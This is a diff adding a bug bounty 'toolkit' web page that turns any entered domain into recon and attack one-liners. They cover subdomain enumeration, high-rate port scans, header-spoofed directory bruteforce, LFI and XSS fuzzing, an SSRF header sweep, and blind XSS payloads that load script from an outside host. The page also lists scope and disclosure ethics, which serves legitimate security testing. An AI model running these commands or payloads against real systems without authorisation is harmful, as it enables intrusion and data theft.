@@ -1,0 +1,2137 @@
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, maximum-scale=5.0, user-scalable=yes">
+  <title>Advanced Bug Hunting Toolkit</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root { 
+      --bg:#0a0a0a; 
+      --fg:#00ff41; 
+      --fg-dim:#00c332; 
+      --card:#0f0f0f; 
+      --border:rgba(0,255,65,0.2); 
+      --muted:#9ae6b4;
+      --danger:#ff4444;
+      --warning:#ffaa00;
+      --info:#00a8ff;
+    }
+    html, body { height: 100%; }
+    body {
+      background:var(--bg); color:var(--fg); font-family:'Courier New', monospace;
+      min-height:100vh; overflow-x:hidden; position:relative; line-height:1.5; font-size:16px;
+      -webkit-text-size-adjust:100%; text-size-adjust:100%;
+    }
+    #matrix-canvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; opacity:.1; }
+    .container { max-width:1400px; margin:0 auto; padding:1.25rem; position:relative; width:100%; }
+    
+    header { display:flex; flex-direction:column; gap:1rem; margin-bottom:1.25rem; }
+    .brand { display:flex; align-items:center; gap:.75rem; }
+    .brand h1 { font-size:clamp(1.25rem,4vw,1.8rem); letter-spacing:.08em; }
+    .subtitle { color:var(--muted); font-size:clamp(.8rem,2.5vw,.95rem); margin-bottom:1rem; }
+    
+    .domain-input-section {
+      background: linear-gradient(180deg, rgba(0,255,65,.05), rgba(0,255,65,.02));
+      border: 1px solid var(--border);
+      border-radius: .875rem;
+      padding: 1.5rem;
+      margin-bottom: 2rem;
+      text-align: center;
+    }
+    
+    .domain-input-section h2 {
+      font-size: 1.5rem;
+      margin-bottom: .5rem;
+      color: var(--fg);
+    }
+    
+    .domain-input-section p {
+      color: var(--muted);
+      margin-bottom: 1.5rem;
+      font-size: .9rem;
+    }
+    
+    .input-group {
+      display: flex;
+      gap: .75rem;
+      max-width: 900px;
+      margin: 0 auto;
+      flex-wrap: wrap;
+    }
+    
+    .domain-input {
+      flex: 1;
+      min-width: 220px;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: .625rem;
+      padding: .75rem 1rem;
+      color: var(--fg);
+      font-family: inherit;
+      font-size: 1rem;
+      outline: none;
+      transition: border-color .15s ease, box-shadow .15s ease;
+    }
+    
+    .domain-input:focus {
+      border-color: var(--fg);
+      box-shadow: 0 0 0 2px rgba(0,255,65,.1);
+    }
+    
+    .generate-btn {
+      background: linear-gradient(135deg, var(--fg-dim), var(--fg));
+      color: var(--bg);
+      border: none;
+      border-radius: .625rem;
+      padding: .75rem 1.5rem;
+      font-weight: bold;
+      cursor: pointer;
+      transition: transform .15s ease, box-shadow .15s ease;
+      font-family: inherit;
+      font-size: 1rem;
+      white-space: nowrap;
+    }
+    
+    .generate-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0,255,65,.3);
+    }
+    
+    .generate-btn:disabled {
+      opacity: .5;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    
+    .results-section {
+      display: none;
+      animation: fadeIn .5s ease;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .results-header {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: .875rem;
+      padding: 1rem;
+      margin-bottom: 1.5rem;
+      text-align: center;
+    }
+    
+    .results-header h3 {
+      color: var(--fg);
+      margin-bottom: .5rem;
+    }
+    
+    .target-domain {
+      color: var(--fg-dim);
+      font-weight: bold;
+      font-size: 1.1rem;
+    }
+    
+    .category {
+      margin-bottom: 2rem;
+    }
+    
+    .category-header {
+      display: flex;
+      align-items: center;
+      gap: .75rem;
+      margin-bottom: 1rem;
+      padding-bottom: .5rem;
+      border-bottom: 2px solid var(--border);
+    }
+    
+    .category-header h3 {
+      font-size: 1.3rem;
+      color: var(--fg);
+    }
+    
+    .category-icon {
+      font-size: 1.2rem;
+      color: var(--fg-dim);
+    }
+    
+    .commands-grid {
+      display: grid;
+      gap: 1rem;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+    }
+    
+    .command-card {
+      background: linear-gradient(180deg, rgba(0,255,65,.03), rgba(0,255,65,.01));
+      border: 1px solid var(--border);
+      border-radius: .875rem;
+      padding: 1rem;
+      transition: transform .12s ease, border-color .12s ease, box-shadow .12s ease;
+      position: relative;
+      min-width: 0;
+    }
+    
+    .command-card:hover {
+      transform: translateY(-2px);
+      border-color: rgba(0,255,65,.45);
+      box-shadow: 0 0 0 2px rgba(0,255,65,.08), 0 12px 30px rgba(0,255,65,.06);
+    }
+
+    /* Featured command card (highlight) */
+    .command-card.featured{
+      border-color: rgba(255,170,0,.75);
+      background: linear-gradient(180deg, rgba(255,170,0,.12), rgba(255,170,0,.04));
+      box-shadow: 0 8px 28px rgba(255,170,0,.18);
+    }
+
+    /* "Open" button shown inside the code box for link-type cards */
+    .command-code .open-btn{
+      position: absolute;
+      top: .5rem;
+      right: .5rem;
+      background: transparent;
+      border: 1px solid var(--border);
+      color: var(--warning);
+      border-radius: .375rem;
+      padding: .25rem .5rem;
+      font-size: .7rem;
+      text-decoration: none;
+      transition: all .15s ease;
+    }
+    .command-code .open-btn:hover{
+      background: var(--warning);
+      color: var(--bg);
+      border-color: var(--warning);
+    }
+    
+    .command-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      margin-bottom: .75rem;
+    }
+    
+    .command-title {
+      font-weight: bold;
+      color: var(--fg);
+      font-size: .95rem;
+      margin-bottom: .25rem;
+    }
+    
+    .command-description {
+      color: var(--muted);
+      font-size: .8rem;
+      line-height: 1.4;
+      margin-bottom: .75rem;
+      word-wrap: break-word;
+      overflow-wrap: anywhere;
+    }
+    
+    /* ---- FIX: long commands should not overflow the card ---- */
+    .command-code {
+      background: rgba(0,0,0,.3);
+      border: 1px solid rgba(0,255,65,.15);
+      border-radius: .5rem;
+      padding: .75rem;
+      padding-right: clamp(3.25rem, 20vw, 7rem);
+      font-family: 'Courier New', monospace;
+      font-size: .8rem;
+      color: var(--fg-dim);
+      position: relative;
+      margin-bottom: .5rem;
+      overflow: auto;
+      -webkit-overflow-scrolling: touch;
+      max-width: 100%;
+    }
+    .command-code pre{
+      margin: 0;
+      white-space: pre;
+      overflow: auto;
+      max-width: 100%;
+      tab-size: 2;
+      padding-right: .5rem;
+    }
+    .command-code::-webkit-scrollbar, .command-code pre::-webkit-scrollbar{ height: 8px; }
+    .command-code::-webkit-scrollbar-track, .command-code pre::-webkit-scrollbar-track{ background: rgba(255,255,255,.06); border-radius: 10px; }
+    .command-code::-webkit-scrollbar-thumb, .command-code pre::-webkit-scrollbar-thumb{ background: rgba(0,255,65,.35); border-radius: 10px; }
+
+    .command-actions {
+      display: flex;
+      gap: .5rem;
+      position: absolute;
+      top: .5rem;
+      right: .5rem;
+      z-index: 1;
+      flex-wrap: wrap;    
+      justify-content: flex-end;
+      max-width: 45%;  
+    }
+
+    /* Link-only cards ya estaban bien; aseguramos que no “bailen” en móvil */
+    .command-card.link-only .command-actions-row{
+      justify-content: flex-start;
+    }
+    
+    .copy-btn, .favorite-btn {
+      background: transparent;
+      border: 1px solid var(--border);
+      color: var(--fg-dim);
+      border-radius: .375rem;
+      padding: .25rem .5rem;
+      cursor: pointer;
+      font-size: .7rem;
+      transition: all .15s ease;
+    }
+    
+    .copy-btn:hover, .favorite-btn:hover {
+      border-color: var(--fg);
+      color: var(--fg);
+    }
+    
+    .copy-btn.copied {
+      background: var(--fg);
+      color: var(--bg);
+      border-color: var(--fg);
+    }
+    
+    .favorite-btn.favorited {
+      background: var(--warning);
+      color: var(--bg);
+      border-color: var(--warning);
+    }
+
+    /* Actions row for cards that are link-only (or future extra buttons) */
+    .command-actions-row{
+      display:flex;
+      gap:.5rem;
+      justify-content:flex-end;
+      margin-top:.5rem;
+    }
+
+    /* Button to open external links */
+    .open-link-btn{
+     background: linear-gradient(135deg, var(--fg-dim), var(--fg));
+     color: var(--bg);
+     border: 1px solid var(--border);
+     border-radius: .375rem;
+     padding: .35rem .7rem;
+     font-size: .75rem;
+     font-weight: 700;
+     text-decoration: none;
+     cursor: pointer;
+     transition: transform .12s ease, box-shadow .12s ease;
+   }
+   .open-link-btn:hover{
+     transform: translateY(-1px);
+     box-shadow: 0 6px 16px rgba(0,255,65,.25);
+   }
+
+   /* Optional: make that special card stand out */
+   .featured-card{
+     background: linear-gradient(135deg, rgba(0,255,65,.08), rgba(0,255,65,.02));
+     border-color: rgba(0,255,65,.55);
+   }
+    
+    .filters {
+      display: flex;
+      gap: .5rem;
+      margin-bottom: 1.5rem;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+    
+    .filter-label {
+      color: var(--muted);
+      font-size: .9rem;
+      margin-right: .5rem;
+    }
+    
+    .filter-btn {
+      background: transparent;
+      color: var(--fg-dim);
+      border: 1px solid var(--border);
+      border-radius: 999px;
+      padding: .3rem .7rem;
+      cursor: pointer;
+      font-size: .75rem;
+      transition: all .15s ease;
+      user-select: none;
+    }
+    
+    .filter-btn.active {
+      background: rgba(0,255,65,.14);
+      border-color: rgba(0,255,65,.55);
+      color: var(--fg);
+    }
+    
+    .search-filter {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: .5rem;
+      padding: .5rem .75rem;
+      color: var(--fg);
+      font-family: inherit;
+      font-size: .8rem;
+      outline: none;
+      margin-left: auto;
+      min-width: 200px;
+    }
+    
+    .search-filter:focus {
+      border-color: var(--fg);
+    }
+    
+    .methodology-section {
+      margin-top: 3rem;
+      padding-top: 2rem;
+      border-top: 2px solid var(--border);
+    }
+    
+    .methodology-grid {
+      display: grid;
+      gap: 1rem;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    }
+    
+    .methodology-card {
+      background: linear-gradient(135deg, rgba(255,170,0,.05), rgba(255,68,68,.05));
+      border: 1px solid rgba(255,170,0,.3);
+      border-radius: .875rem;
+      padding: 1rem;
+      text-decoration: none;
+      color: var(--fg);
+      transition: all .15s ease;
+    }
+    
+    .methodology-card:hover {
+      transform: translateY(-2px);
+      border-color: var(--warning);
+      box-shadow: 0 5px 20px rgba(255,170,0,.2);
+    }
+    
+    .methodology-title {
+      font-weight: bold;
+      margin-bottom: .5rem;
+      color: var(--warning);
+    }
+    
+    .methodology-tags {
+      display: flex;
+      gap: .25rem;
+      flex-wrap: wrap;
+    }
+    
+    .methodology-tag {
+      background: rgba(255,170,0,.1);
+      color: var(--warning);
+      padding: .1rem .4rem;
+      border-radius: .25rem;
+      font-size: .6rem;
+    }
+
+    .best-practices-card {
+      background: linear-gradient(135deg, rgba(255, 68, 68, 0.08), rgba(255, 68, 68, 0.02));
+      border: 1px solid rgba(255, 68, 68, 0.4);
+      border-radius: .875rem;
+      padding: 1.5rem;
+      text-decoration: none;
+      color: var(--fg);
+      transition: all .15s ease;
+      margin-top: 1rem;
+    }
+
+    .best-practices-card:hover {
+      transform: translateY(-2px);
+      border-color: var(--danger);
+      box-shadow: 0 5px 20px rgba(255, 68, 68, 0.2);
+    }
+
+    .best-practices-card ul {
+      color: var(--muted);
+      line-height: 1.6;
+    }
+
+    .best-practices-card li {
+      margin-bottom: 0.5rem;
+    }
+    
+    .export-section {
+      background: linear-gradient(135deg, rgba(0,168,255,.05), rgba(0,255,65,.05));
+      border: 1px solid rgba(0,168,255,.3);
+      border-radius: .875rem;
+      padding: 1rem;
+      margin-bottom: 2rem;
+      text-align: center;
+    }
+    
+    .export-title {
+      font-weight: bold;
+      margin-bottom: .5rem;
+      color: var(--info);
+    }
+    
+    .export-buttons {
+      display: flex;
+      gap: 1rem;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+    
+    .export-btn {
+      background: transparent;
+      border: 1px solid var(--info);
+      color: var(--info);
+      border-radius: .5rem;
+      padding: .5rem 1rem;
+      cursor: pointer;
+      transition: all .15s ease;
+      font-family: inherit;
+    }
+    
+    .export-btn:hover {
+      background: var(--info);
+      color: var(--bg);
+    }
+
+    html { overflow-x: hidden; }
+    
+    .notification {
+      position: fixed;
+      top: 20px;
+      right: max(20px, env(safe-area-inset-right));
+      background: var(--card);
+      border: 1px solid var(--fg);
+      border-radius: .5rem;
+      padding: 1rem;
+      color: var(--fg);
+      z-index: 1000;
+      transform: translateX(calc(100% + 24px)); /* fuera, pero sin crear ancho extra */
+      will-change: transform;
+      transition: transform .3s ease;
+      max-width: 300px;
+    }
+    
+    .notification.show {
+      transform: translateX(0);
+    }
+
+    pre, code, .command-code { max-width: 100%; }
+
+    
+    footer { 
+      margin-top: 3rem; 
+      font-size: .75rem; 
+      color: var(--muted); 
+      text-align: center; 
+      padding: 2rem 0;
+      border-top: 1px solid var(--border);
+    }
+    
+    /* ====== Breakpoints finos ====== */
+
+/* <= 992px: tipografía un pelín más cómoda y grillas más densas */
+@media (max-width: 992px){
+  .container{ padding: 1rem; }
+  .command-code{ font-size: .85rem; }
+}
+
+/* <= 768px: una columna garantizada para comandos (ya lo hacías), 
+   además movemos botones abajo si no hay espacio horizontal */
+@media (max-width: 768px){
+  .input-group{ flex-direction: column; align-items: stretch; }
+  .commands-grid{ grid-template-columns: 1fr; }
+  .search-filter{ margin-left: 0; margin-top: .5rem; width: 100%; min-width: 0; }
+  .export-buttons{ flex-direction: column; align-items: stretch; }
+  .command-actions{
+    position: static;          /* saca absolutos en pantallas pequeñas */
+    margin-bottom: .5rem;
+    max-width: 100%;
+  }
+  .command-code{
+    padding-right: .75rem;     /* ya no reservamos espacio lateral */
+  }
+}
+
+/* <= 480px: reducir aún más el espacio de botones y font-size de código */
+@media (max-width: 480px){
+  .command-code{ font-size: .78rem; }
+  .copy-btn, .favorite-btn{ font-size: .68rem; padding: .25rem .45rem; }
+  .open-link-btn{ font-size: .72rem; padding: .35rem .6rem; }
+  .category-header h3{ font-size: 1.1rem; }
+}
+
+/* Mejor accesibilidad/reducción de movimiento */
+@media (prefers-reduced-motion: reduce){
+  .command-card, .generate-btn, .open-link-btn, .methodology-card{
+    transition: none !important;
+  }
+}
+  </style>
+</head>
+<body>
+  <canvas id="matrix-canvas" aria-hidden="true" width="874" height="748"></canvas>
+  <div class="notification" id="notification"></div>
+
+  <div class="container">
+    <header>
+      <div class="brand">
+        <i class="fa-solid fa-bug" aria-hidden="true"></i>
+        <h1>Advanced Bug Hunting Toolkit | System32</h1>
+      </div>
+      <p class="subtitle">Generate comprehensive reconnaissance and vulnerability testing commands for any domain</p>
+    </header>
+
+    <section class="domain-input-section">
+      <h2><i class="fa-solid fa-crosshairs"></i> Target Domain</h2>
+      <p>Enter a domain to generate all one-liner commands for comprehensive security testing</p>
+      <div class="input-group">
+        <input type="text" class="domain-input" id="domainInput" placeholder="example.com">
+        <button class="generate-btn" id="generateBtn">
+          <i class="fa-solid fa-rocket"></i> Generate Commands
+        </button>
+      </div>
+    </section>
+
+    <section class="results-section" id="resultsSection">
+      <div class="results-header">
+        <h3>Commands updated for: <span class="target-domain" id="targetDomain"></span></h3>
+      </div>
+
+      <div class="export-section">
+        <div class="export-title">Export Commands</div>
+        <div class="export-buttons">
+          <button class="export-btn" id="exportTxt"><i class="fa-solid fa-file-text"></i> Export as TXT</button>
+          <button class="export-btn" id="exportJson"><i class="fa-solid fa-file-code"></i> Export as JSON</button>
+          <button class="export-btn" id="exportSh"><i class="fa-solid fa-terminal"></i> Export as .SH</button>
+          <button class="export-btn" id="exportFavorites"><i class="fa-solid fa-star"></i> Export Favorites</button>
+        </div>
+      </div>
+
+      <div class="filters">
+        <span class="filter-label">Filter by category:</span>
+        <button class="filter-btn active" data-category="all">All</button>
+        <button class="filter-btn" data-category="subdomain">Subdomain</button>
+        <button class="filter-btn" data-category="url">URL Collection</button>
+        <button class="filter-btn" data-category="sensitive">Sensitive Data</button>
+        <button class="filter-btn" data-category="xss">XSS Testing</button>
+        <button class="filter-btn" data-category="lfi">LFI Testing</button>
+        <button class="filter-btn" data-category="cors">CORS Testing</button>
+        <button class="filter-btn" data-category="wordpress">WordPress</button>
+        <button class="filter-btn" data-category="network">Network</button>
+        <button class="filter-btn" data-category="parameters">Parameters</button>
+        <button class="filter-btn" data-category="osint">OSINT</button>
+        <button class="filter-btn" data-category="graphql">GraphQL/APIs</button>
+        <button class="filter-btn" data-category="nuclei">Nuclei</button>
+        <button class="filter-btn" data-category="injection">Injection</button>
+        <button class="filter-btn" data-category="idor">IDOR/Access</button>
+        <button class="filter-btn" data-category="wordlist">Discovery</button>
+        <button class="filter-btn" data-category="cloud">Cloud</button>
+        <button class="filter-btn" data-category="tech">Fingerprint</button>
+        <button class="filter-btn" data-category="javascript">JavaScript</button>
+        <button class="filter-btn" data-category="content">Content Type</button>
+        <button class="filter-btn" data-category="methodology">Methodology</button>
+        <button class="filter-btn" data-category="ssti">SSTI</button>
+        <button class="filter-btn" data-category="favorites">Favorites</button>
+        <input type="text" class="search-filter" id="searchFilter" placeholder="Search commands...">
+      </div>
+
+      <div id="commandsContainer"></div>
+
+      <div class="methodology-section">
+       <div class="category-header">
+         <i class="fa-solid fa-lightbulb category-icon"></i>
+         <h3>Bug Bounty Tips</h3>
+       </div>
+       <div class="methodology-grid" id="methodologyGrid"></div>
+  
+       <!-- Nueva sección de Mejores Prácticas -->
+       <div class="category-header" style="margin-top: 2rem;">
+         <i class="fa-solid fa-shield-halved category-icon"></i>
+         <h3>Best Practices</h3>
+       </div>
+       <div class="best-practices-card">
+         <div class="methodology-title" style="color: var(--danger);">
+           <i class="fa-solid fa-triangle-exclamation"></i> Essential Security Practices
+         </div>
+         <div class="methodology-description">
+           <ul style="text-align: left; margin-left: 1rem;">
+             <li>Always respect the program's scope and rules of engagement</li>
+             <li>Never test out-of-scope assets without explicit permission</li>
+             <li>Avoid destructive testing that could impact service availability</li>
+             <li>Do not access or modify other users' data without permission</li>
+             <li>Report vulnerabilities responsibly through proper channels</li>
+             <li>Keep your findings confidential until they are resolved</li>
+             <li>Use dedicated testing accounts when provided</li>
+             <li>Follow responsible disclosure timelines</li>
+           </ul>
+         </div>
+         <div class="methodology-tags">
+           <span class="methodology-tag">ethics</span>
+           <span class="methodology-tag">legal</span>
+           <span class="methodology-tag">professional</span>
+         </div>
+       </div>
+     </div>
+    </section>
+
+    <footer>
+      © <span id="year">2026</span> Advanced Bug Hunting Toolkit · System32
+    </footer>
+  </div>
+
+  <script>
+    // Matrix rain effect
+    const canvas = document.getElementById('matrix-canvas');
+    const ctx = canvas.getContext('2d');
+    const glyphs = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}'.split('');
+    const fontSize = 12;
+    let columns = 0, drops = [], animId = null, running = false;
+
+    const resize = () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      columns = Math.floor(canvas.width / fontSize);
+      drops = Array(columns).fill(1);
+    };
+
+    function frame() {
+      ctx.fillStyle = 'rgba(0,0,0,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = '#00ff41';
+      ctx.font = fontSize + 'px Courier New';
+      for (let i = 0; i < drops.length; i++) {
+        const ch = glyphs[Math.floor(Math.random() * glyphs.length)];
+        ctx.fillText(ch, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      }
+      animId = requestAnimationFrame(frame);
+    }
+
+    function startMatrix() {
+      if (!running) {
+        running = true;
+        animId = requestAnimationFrame(frame);
+      }
+    }
+
+    function stopMatrix() {
+      if (running) {
+        running = false;
+        cancelAnimationFrame(animId);
+      }
+    }
+
+    window.addEventListener('resize', resize);
+    resize();
+    startMatrix();
+    document.addEventListener('visibilitychange', () =>
+      document.hidden ? stopMatrix() : startMatrix()
+    );
+
+    // Commands data
+    const commandCategories = [
+      /* ========== NEW: Advanced Recon Methodology — Web Security ========== */
+      {
+        name: "Advanced Recon Methodology — Web Security",
+        icon: "fa-solid fa-flag-checkered",
+        category: "methodology",
+        commands: [
+          { title: "Find subdomains", description: "Recursive subdomain enumeration.", command: `subfinder -d {domain} -all -recursive > subdomain.txt` },
+          { title: "Filter live subdomains", description: "Alive check with httpx-toolkit.", command: `cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt` },
+          { title: "Fetch passive URLs", description: "Collect URLs from public sources.", command: `katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt` },
+          { title: "Find sensitive files", description: "Filter potentially sensitive file extensions.", command: `cat allurls.txt | grep -E '\\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5)'` },
+
+          { title: "Fetch & sort URLs (1)", description: "Katana passive + qurl format.", command: `echo {domain} | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt` },
+          { title: "Fetch & sort URLs (2)", description: "First-party crawl + dedupe.", command: `katana -u https://{domain} -d 5 | grep '=' | urldedupe | anew output.txt` },
+          { title: "Fetch & sort URLs (3)", description: "Normalize parameters.", command: `cat output.txt | sed 's/=.*/=/' >final.txt` },
+          { title: "Fetch & sort URLs (4)", description: "GAU 200s only.", command: `echo {domain} | gau --mc 200 | urldedupe >urls.txt` },
+          { title: "Fetch & sort URLs (5)", description: "Keep dynamic endpoints.", command: `cat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort > output.txt` },
+          { title: "Fetch & sort URLs (6)", description: "Normalize parameters again.", command: `cat output.txt | sed 's/=.*/=/' >final.txt` },
+
+          { title: "Hidden params (Arjun, passive)", description: "Passive parameter discovery.", command: `arjun -u https://{domain}/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers 'User-Agent: Mozilla/5.0'` },
+          { title: "Hidden params (Arjun, wordlist)", description: "Active wordlist discovery.", command: `arjun -u https://{domain}/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'` },
+
+          { title: "CORS check (1)", description: "Basic CORS probe.", command: `curl -H 'Origin: http://{domain}' -I https://{domain}/wp-json/` },
+          { title: "CORS check (2)", description: "Inspect key response headers.", command: `curl -H 'Origin: http://{domain}' -I https://{domain}/wp-json/ | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'` },
+
+          { title: "Info disclosure dork", description: "Google dork for leaks.", command: `site:*.{domain} (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)` },
+          { title: "WordPress aggressive scan", description: "Full WP enumeration.", command: `wpscan --url https://{domain} --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force` },
+
+          { title: "LFI methodology (ffuf)", description: "Classic LFI sweep.", command: `echo 'https://{domain}/' | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr 'root:(x|\\*|\\$[^\\:]*):0:0:' -v` },
+
+          { title: "Dir bruteforce (dirsearch)", description: "Deep directory bruteforce.", command: `dirsearch -u https://{domain} -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1` },
+          { title: "Dir bruteforce (ffuf)", description: "Recursive FUZZ with headers.", command: `ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://{domain}/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-Host: localhost' -t 100 -r -o results.json` },
+
+          { title: "JS file hunting (1)", description: "Find JS and scan exposures.", command: `echo {domain} | katana -d 5 | grep -E '\\.js$' | nuclei -t nuclei-templates/http/exposures/ -c 30` },
+          { title: "JS file hunting (2)", description: "Scan collected JS (custom path).", command: `nuclei -l alljs.txt -t ~/nuclei-templates/http/exposures/ -c 50 -o js_exposures.txt` },
+
+          { title: "Subdomain takeover", description: "Check for takeovers with subzy.", command: `subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl` },
+          { title: "CORS scan (Corsy)", description: "CORS with custom headers.", command: `python3 corsy.py -i subdomains_alive.txt -t 10 --headers 'User-Agent: GoogleBot\\nCookie: SESSION=Hacked'` },
+
+          { title: "Header-based Blind XSS", description: "BXSS via X-Forwarded-For.", command: `subfinder -d {domain} | gau | bxss -payload "'><script src=https://xss.report/c/caballo><\\/script>" -header 'X-Forwarded-For'` },
+          { title: "Single XSS check (all URLs)", description: "Replace values and look for exact reflection.", command: `echo {domain} | gau | qsreplace '<sCript>confirm(1)<\\/sCript>' | xsschecker -match '<sCript>confirm(1)<\\/sCript>' -vuln` },
+          { title: "Blind XSS (parameters)", description: "BXSS against discovered parameters.", command: `subfinder -d {domain} | gau | grep '&' | bxss -appendMode -payload "'><script src=https://xss.report/c/caballo><\\/script>" -parameters` },
+
+          { title: "Content-type filter (HTML)", description: "Keep only HTML endpoints.", command: `echo {domain} | gau | grep -Eo '(\\/[^\\/]+)\\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml\\+xml'` },
+
+          { title: "Shodan dork — SSL CN", description: "Find hosts by certificate CN.", command: `Ssl.cert.subject.CN:"{domain}" 200` },
+
+          { title: "XSS method (1)", description: "Typical XSS pipeline.", command: `echo https://{domain}/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt` },
+          { title: "XSS method (2)", description: "Normalize for fuzzing.", command: `cat xss_output.txt | grep -oP '^URL: \\K\\S+' | sed 's/=.*/=/' | sort -u > final.txt` },
+
+          { title: "Naabu scan", description: "Fast port scan (with nmap handoff).", command: `naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt` },
+          { title: "Nmap full scan", description: "Full TCP with service detection.", command: `nmap -p- --min-rate 1000 -T4 -A {domain} -oA fullscan` },
+          { title: "Masscan", description: "Ultra-fast port sweep.", command: `masscan -p0-65535 {domain} --rate 100000 -oG masscan-results.txt` },
+
+          { title: "FFUF request-file — LFI", description: "Bruteforce LFI with request file.", command: `ffuf -request lfi -request-proto https -w /root/wordlists/offensive\\ payloads/LFI\\ payload.txt -c -mr 'root:'` },
+          { title: "FFUF request-file — XSS", description: "Bruteforce XSS (payload escaped).", command: `ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')<\\/script>"` },
+
+          { title: "XSS/SSRF header sweep", description: "Multiple headers toward collaborator.", command: `cat domains.txt | assetfinder --subs-only | httprobe | while read url; do xss1=$(curl -s -L "$url" -H 'X-Forwarded-For: xss.yourburpcollaborator' | grep -i xss); xss2=$(curl -s -L "$url" -H 'X-Forwarded-Host: xss.yourburpcollaborator' | grep -i xss); xss3=$(curl -s -L "$url" -H 'Host: xss.yourburpcollaborator' | grep -i xss); xss4=$(curl -s -L "$url" --request-target http://burpcollaborator/ --max-time 2); echo -e "\\e[1;32m$url\\e[0m\\nMethod[1] X-Forwarded-For: xss+ssrf => $xss1\\nMethod[2] X-Forwarded-Host: xss+ssrf ==> $xss2\\nMethod[3] Host: xss+ssrf ==> $xss3\\nMethod[4] GET http://xss.yourburpcollaborator HTTP/1.1 \\n"; done` },
+
+          { title: "LFI via httpx paths", description: "Test LFI payload list with httpx-toolkit.", command: `echo 'https://{domain}/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\\*|\\$[^\\:]*):0:0:'` }
+        ]
+      },
+      {
+       name: "Advanced Google Dorks Methodology",
+       icon: "fa-solid fa-magnifying-glass-plus",
+       category: "methodology",
+       commands: [
+         { title: "Indexing footprint", description: "All indexed pages on the root domain.", command: `site:{domain}` },
+         { title: "Indexed subdomains", description: "Indexed pages across subdomains.", command: `site:*.{domain}` },
+         { title: "Exclude www", description: "Find non-www subdomains.", command: `site:*.{domain} -site:www.{domain}` },
+
+         { title: "Login/Admin panels", description: "Common admin or auth endpoints.", command: `site:{domain} (inurl:admin OR inurl:login OR inurl:signin OR inurl:auth)` },
+         { title: "Public backups", description: "Backup/old archives likely exposed.", command: `site:{domain} (ext:sql OR ext:bak OR ext:backup OR ext:old OR ext:rar OR ext:7z OR ext:tar OR ext:gz)` },
+         { title: "Config & env files", description: "Potentially sensitive configuration.", command: `site:{domain} (ext:env OR ext:ini OR ext:cfg OR ext:conf OR ext:yml OR ext:yaml) -github` },
